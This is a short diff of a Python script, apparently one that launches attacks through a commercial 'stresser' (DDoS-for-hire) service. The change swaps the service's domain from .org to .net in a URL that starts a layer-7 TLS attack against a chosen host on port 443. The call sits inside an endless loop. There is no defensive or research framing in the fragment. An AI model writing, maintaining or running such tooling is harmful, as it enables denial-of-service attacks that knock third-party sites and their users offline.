@@ -44,7 +44,7 @@ def main():
         "Priority": "u=1, i"
     }
 
-    url = f"https://redstresser.org/complexx/layer7.php?type=start&host={host}&port=443&time=100&method=TLS-DETECT&totalservers=1&vip=undefined"
+    url = f"https://redstresser.net/complexx/layer7.php?type=start&host={host}&port=443&time=100&method=TLS-DETECT&totalservers=1&vip=undefined"
 
     while True:
         try:
